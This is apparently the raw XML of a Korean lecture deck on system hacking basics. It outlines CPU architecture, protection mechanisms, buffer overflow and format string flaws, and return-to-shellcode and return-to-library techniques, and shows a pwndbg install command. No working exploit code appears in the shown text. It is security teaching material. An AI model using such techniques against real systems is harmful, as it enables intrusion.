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81" r:id="rId4"/>
    <p:sldId id="319" r:id="rId5"/>
    <p:sldId id="352" r:id="rId6"/>
    <p:sldId id="258" r:id="rId7"/>
    <p:sldId id="264" r:id="rId8"/>
    <p:sldId id="320" r:id="rId9"/>
    <p:sldId id="321" r:id="rId10"/>
    <p:sldId id="290" r:id="rId11"/>
    <p:sldId id="302" r:id="rId12"/>
    <p:sldId id="292" r:id="rId13"/>
    <p:sldId id="303" r:id="rId14"/>
    <p:sldId id="293" r:id="rId15"/>
    <p:sldId id="294" r:id="rId16"/>
    <p:sldId id="296" r:id="rId17"/>
    <p:sldId id="262" r:id="rId18"/>
    <p:sldId id="318" r:id="rId19"/>
    <p:sldId id="308" r:id="rId20"/>
    <p:sldId id="312" r:id="rId21"/>
    <p:sldId id="310" r:id="rId22"/>
    <p:sldId id="313" r:id="rId23"/>
    <p:sldId id="314" r:id="rId24"/>
    <p:sldId id="291" r:id="rId25"/>
    <p:sldId id="323" r:id="rId26"/>
    <p:sldId id="317" r:id="rId27"/>
    <p:sldId id="322" r:id="rId28"/>
    <p:sldId id="324" r:id="rId29"/>
    <p:sldId id="325" r:id="rId30"/>
    <p:sldId id="299" r:id="rId31"/>
    <p:sldId id="346" r:id="rId32"/>
    <p:sldId id="341" r:id="rId33"/>
    <p:sldId id="345" r:id="rId34"/>
    <p:sldId id="347" r:id="rId35"/>
    <p:sldId id="348" r:id="rId36"/>
    <p:sldId id="349" r:id="rId37"/>
    <p:sldId id="350" r:id="rId38"/>
    <p:sldId id="297" r:id="rId39"/>
    <p:sldId id="326" r:id="rId40"/>
    <p:sldId id="330" r:id="rId41"/>
    <p:sldId id="327" r:id="rId42"/>
    <p:sldId id="328" r:id="rId43"/>
    <p:sldId id="331" r:id="rId44"/>
    <p:sldId id="329" r:id="rId45"/>
    <p:sldId id="335" r:id="rId46"/>
    <p:sldId id="336" r:id="rId47"/>
    <p:sldId id="298" r:id="rId48"/>
    <p:sldId id="333" r:id="rId49"/>
    <p:sldId id="337" r:id="rId50"/>
    <p:sldId id="338" r:id="rId51"/>
    <p:sldId id="339" r:id="rId52"/>
    <p:sldId id="340" r:id="rId53"/>
    <p:sldId id="342" r:id="rId54"/>
    <p:sldId id="351" r:id="rId55"/>
    <p:sldId id="344" r:id="rId56"/>
    <p:sldId id="343" r:id="rId57"/>
    <p:sldId id="353" r:id="rId58"/>
    <p:sldId id="332" r:id="rId59"/>
    <p:sldId id="354" r:id="rId60"/>
    <p:sldId id="355" r:id="rId61"/>
    <p:sldId id="356" r:id="rId62"/>
    <p:sldId id="364" r:id="rId63"/>
    <p:sldId id="285" r:id="rId6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939"/>
    <a:srgbClr val="04396C"/>
    <a:srgbClr val="1E3252"/>
    <a:srgbClr val="6497B1"/>
    <a:srgbClr val="AEAFA9"/>
    <a:srgbClr val="418A9D"/>
    <a:srgbClr val="BCDEE3"/>
    <a:srgbClr val="005289"/>
    <a:srgbClr val="007095"/>
    <a:srgbClr val="0260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57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F6387-3403-4348-8A94-7ADE7975A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852A9D-DEAB-4D3B-BE4C-4D5506949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DBC8D7-B31E-450F-BC14-69F5BA00A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2F3B2-7919-4755-A2BA-E60311F1A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BE1C44-6ED9-45C3-85CE-F181F644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409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9836B-546E-427C-901C-507669B2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22D5C6-D2D2-4C8F-ADE8-FA9D32A89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0A3C13-BB40-4BA2-97FB-232FA10CF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6734E-5F3B-46DF-83F4-5253AC7D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863EFD-2ECD-484B-8FE3-BD46DBAB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135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C50236-D72C-46A8-8E43-F403AB51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9E0306-8C68-4BA2-8E35-84C5A601A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55EBBB-3A9E-4875-91BC-BA0F98B7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214B26-FD9B-4500-9159-1814890F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3211AD-49EC-4C32-ACD3-8CF24D255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60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35847-E819-401C-8088-DE14C838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E0E58-A374-46C3-99E5-8CB532762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D73669-31FC-4A43-BE3F-20FBB4989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487473-0381-424C-935F-E8DD5300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79DC7E-293A-4118-BB25-14F86368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BF8C06-A6F4-4D56-9961-2A48D376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3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92F4D-6C94-4897-AF69-B2184F15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8BF44-B930-48BD-847E-4378CC007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8F7027-CD07-42A0-AF50-45BC8A27D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38A2D0-3A12-4C29-9758-C0FA7862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EA347A6-004A-4A7B-931A-4A1D4E962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A1E329-33C9-4A40-B00F-E72E7768B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8414FA-5EF1-4D32-A0B3-F5970B61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5AB276-1D41-4C3A-B4C6-AE34D86B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83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6D34C-E153-4E55-8BE2-053CB23A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C41366-6F59-49C8-B46F-241BACE3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1036E6-7409-4CCD-A33A-E8923C9C4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FED2EA-EEA3-4D31-83CA-82087B8C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54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6C1AD2-5128-41ED-895C-723FBDAB28FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10200752" y="6614007"/>
            <a:ext cx="19880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4746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800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4746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 err="1">
                <a:solidFill>
                  <a:srgbClr val="4746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800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4746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>
                <a:solidFill>
                  <a:srgbClr val="4746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800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="4746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CF9D7B-2295-434C-BB50-FBDB7CB4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331C84-82A9-49FF-9C58-209FA7C6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52F265-5EDF-47AD-8C48-23E44987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314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EF8880-0C23-4695-A0B7-BA55B9DCC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C1AD2-5128-41ED-895C-723FBDAB28FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10200752" y="6614007"/>
            <a:ext cx="19880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CF9D7B-2295-434C-BB50-FBDB7CB4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331C84-82A9-49FF-9C58-209FA7C6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52F265-5EDF-47AD-8C48-23E44987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029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6295C-1AC2-468F-BE1D-57C4A587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AFE7A1-9037-44AB-B32C-A03544783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B44BA5-E666-41CE-9AB1-709CA4AED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42D173-D60A-49DD-9BBC-DFAC8464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9DC195-CC0D-4F1D-BA6A-0A1D6BEC9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4EE9A9-6FA0-459E-9839-090D4821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375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7AC93-7A39-431A-9FB1-1E98C130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84B2D7-51AE-4A98-A99F-A3EB7D93C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5744A8-FE11-4335-B99E-0C709334F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DD8B86-F04B-471A-B701-77C39BC7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FDA001-D3E8-406C-85C1-C16B2895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AB922F-8FE5-4AD9-B4B7-0C32F5C0F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050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1F6FB-27DF-4EF8-9C39-2843CFAC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DDFF65-E6AC-4DE9-BC59-8D94C9C73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13491-F16F-4D87-A871-72DDAB23D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BB5D74-5FA0-4FE3-8C76-C5846785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277ED0-AEC3-4AF7-92C1-9B942CF7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932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26BB87-EA73-4676-B5EE-CF484C7F3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EB9E6B-3317-49B6-BD7E-5D8A6D128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2096CD-9EE4-4657-B340-5D82EA01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A142E6-326E-4C16-9093-56979C03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65AFA-C355-40C1-80F6-8264E94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908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1A1494-3269-44A5-B276-FD1B1151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BE9EB2-ED9C-4B7A-B116-2B1071C0D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F56052-6094-4163-A308-25120BD6E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5567D-AB5D-4AC7-81EF-B47DBFAE57A2}" type="datetimeFigureOut">
              <a:rPr lang="ko-KR" altLang="en-US" smtClean="0"/>
              <a:t>2026. 10. 18.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B435DB-002D-4705-918F-4D6B8113C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DB5B9A-8BFA-48CC-9427-80D408861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05B24-248A-42BE-A553-D13EA5F4B5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96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7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chapman.org/posts/Linux_System_Call_Table_for_x86_64/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7.sv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7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0C4291-AA49-4611-97D5-21EC4368F85B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3805953" y="2676872"/>
            <a:ext cx="45801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spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>시스템 해킹 기초</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="4800" spc="-300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1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F12AE3B-B2F6-41CB-8089-A3BC3350D683}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3862055" y="217289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BDE27BE-D47F-4C86-A8A7-881E337B1B9F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3862055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579EC9-5759-4D72-9456-D207CF1DDEEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10453359" y="5818303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심현호 전임</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="157274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967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1A4C0C-593F-49EA-A036-AAE8EB62D98B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="354520" y="199608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+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>차례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D65EFFB-77B3-4093-9EBE-5BC7CD9D594B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1051206" y="2052122"/>
            <a:ext cx="3833921" cy="523220"/>
            <a:chOff x="294640" y="3596640"/>
            <a:chExt cx="3833921" cy="52322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775390-ADD7-4C94-8805-D912724ABC3E}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="294640" y="3596640"/>
              <a:ext cx="3930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1</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR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461C2D-7B54-4B3D-9449-360FD650556A}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="943394" y="3688973"/>
              <a:ext cx="31851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spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="39393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CPU </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="39393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아키텍처 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" sz="2000" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="39393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(CPU Architecture)</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="39393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CF3CB36-97CB-4B01-AB5E-847ED38F7969}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1051206" y="2661824"/>
            <a:ext cx="1782398" cy="523220"/>
            <a:chOff x="294640" y="3596640"/>
            <a:chExt cx="1782398" cy="52322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33E10E-6802-4565-A9E8-5457EEEB6662}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="294640" y="3596640"/>
              <a:ext cx="3930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2</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR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C73533-A9D9-4EEB-A800-80F0AD62009F}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="943394" y="3688973"/>
              <a:ext cx="11336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spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="39393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프로그램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0D1E44C-6008-4F6E-880B-4E8105F0CF77}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1051206" y="3275849"/>
            <a:ext cx="1782398" cy="523220"/>
            <a:chOff x="294640" y="3596640"/>
            <a:chExt cx="1782398" cy="5232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C6CD2E-3CC1-4835-B282-AE92CEFFFE97}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="294640" y="3596640"/>
              <a:ext cx="3930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3</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR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245155-BF92-4471-AC62-A87A47A31390}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="943394" y="3688973"/>
              <a:ext cx="113364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spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="39393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보호기법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A60C88-E00E-9C0A-1F65-728D5C721EDE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1051206" y="3889874"/>
            <a:ext cx="2514136" cy="523220"/>
            <a:chOff x="294640" y="3596640"/>
            <a:chExt cx="2514136" cy="5232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9538F9-6096-2D25-E990-4A0A4EE8E350}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="294640" y="3596640"/>
              <a:ext cx="3930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4</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR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313BDB-CDA4-D1C1-5390-50A4E458CF3B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="943394" y="3688973"/>
              <a:ext cx="18653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spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="39393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Return to Shellcode</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="39393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3D07C80-1646-E9D3-9E97-36249D33DE34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1051206" y="4503899"/>
            <a:ext cx="2263812" cy="523220"/>
            <a:chOff x="294640" y="3596640"/>
            <a:chExt cx="2263812" cy="5232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F36F5AC-EBEB-E444-638E-0C714054BF8D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="294640" y="3596640"/>
              <a:ext cx="3930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5</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR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0580581-1CBF-D6AA-EC39-DC76B659BB97}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="943394" y="3688973"/>
              <a:ext cx="16150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spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="39393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Return to Library</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="39393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061C0AE-1FFB-C08A-4D3E-8286FB3F78F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1051206" y="5117924"/>
            <a:ext cx="1349587" cy="523220"/>
            <a:chOff x="294640" y="3596640"/>
            <a:chExt cx="1349587" cy="52322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09FDEE-EE1A-B982-018F-EB64D16B6AA0}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="294640" y="3596640"/>
              <a:ext cx="39305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b="1" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="accent1"/>
                  </a:solidFill>
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:rPr>
                <a:t>6</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2800" b="1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BD6FFAB-238B-4596-B5BB-85CF2C8A06E9}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="943394" y="3688973"/>
              <a:ext cx="700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spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939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Q &amp; A</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939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154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D7A5D-3186-4736-8A6E-94B9C6DA9065}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="404226" y="2225038"/>
            <a:ext cx="114916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spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="나눔스퀘어 ExtraBold" panose="020B0600000101010101" pitchFamily="50" charset="-127"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>특정 시스템  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3200" spc="-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(PC, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3200" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="나눔스퀘어 ExtraBold" panose="020B0600000101010101" pitchFamily="50" charset="-127"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>핸드폰 등</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3200" spc="-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ko-KR" altLang="en-US" sz="3200" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="나눔스퀘어 ExtraBold" panose="020B0600000101010101" pitchFamily="50" charset="-127"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>의  취약점을 통해 임의의 동작을 수행하게 하거나 제어를</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3200" spc="-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3200" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="나눔스퀘어 ExtraBold" panose="020B0600000101010101" pitchFamily="50" charset="-127"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>획득하는 행위</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="3200" spc="-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89D0E-107A-476A-ADD6-25FB1C008E39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="404226" y="576014"/>
            <a:ext cx="3963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  <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>시스템 해킹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C993A6-18AA-11F5-FB53-84693CBB84FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="404226" y="4551170"/>
            <a:ext cx="31924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600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="나눔스퀘어 ExtraBold" panose="020B0600000101010101" pitchFamily="50" charset="-127"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>* </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="나눔스퀘어 ExtraBold" panose="020B0600000101010101" pitchFamily="50" charset="-127"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>취약점</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1600" spc="-300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="나눔스퀘어 ExtraBold" panose="020B0600000101010101" pitchFamily="50" charset="-127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ko-KR" altLang="en-US" sz="1600" spc="-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버퍼  오버 플로우</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1600" spc="-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ko-KR" altLang="en-US" sz="1600" spc="-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포맷 스트링 취약점</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1600" spc="-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ko-KR" altLang="en-US" sz="1600" spc="-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초기화 되지 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1600" spc="-30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않은</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1600" spc="-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동적 메모리 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1600" spc="-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ko-KR" altLang="en-US" sz="1600" spc="-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등등</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1600" spc="-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0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22AF9-8EA7-2687-6408-4952F4D4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EC6545-91AF-FC2D-F41B-ACBB8FCE53EA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142089-0C6F-DFC0-7D58-ADE4685CA8C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="2640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err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pwndbg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>설치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09A0E-7284-8873-E68D-372C4DC73682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0,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F36CDD-984D-BB2C-8DE2-D79A21D0EBFE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1157725"/>
            <a:ext cx="9945909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동적 분석 도구인 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gdb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서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pwndbg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플러그인을 설치합니다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기존 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gdb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에 비해 보다 편리한 기능과 가독성을 높여줍니다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sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> git clone https://github.com/pwndbg/pwndbg</a:t>
            </a:r>
          </a:p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cd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pwndbg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> &amp;&amp; ./setup.sh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B4948B-6811-3C19-141A-97127FF1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34" y="2987441"/>
            <a:ext cx="4554552" cy="33664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973C6A-F5E6-92D6-856B-4875DEAA4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288" y="2987441"/>
            <a:ext cx="4570409" cy="36367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D98673-676B-71DF-2302-BEE80D76D9B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2599863" y="2532408"/>
            <a:ext cx="60144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gdb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8433A6-C718-9805-327B-8AD51163244D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8105356" y="2532408"/>
            <a:ext cx="1042272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95000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>pwngdb</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR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72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3BCE6-EFBA-3092-AE38-BCD03B25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1159280-E946-31CF-894B-40F821734A2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97429-EAA1-A81F-1434-E0B1AA277298}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="2640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 err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pwndbg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>설치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4638-005C-E2EB-2C02-35DD75B5BAF6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0,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119F9AA-91AA-852A-B035-FC6BD5A6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295" y="1377316"/>
            <a:ext cx="65341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1F6F75-B221-4061-B962-758F7C3BEB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4720" y="0"/>
            <a:ext cx="871728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FB742AF-8DE1-4801-BAAB-FF7C033D40F3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B29B74-5530-431A-9A1D-6C360E5E40A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1998168" y="3124005"/>
            <a:ext cx="26100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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US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아키텍처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DC040-1911-4DE1-B7BA-8D50B20BC5F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="3121223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9C7568C-DA98-40CE-9115-1F19853EEDF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
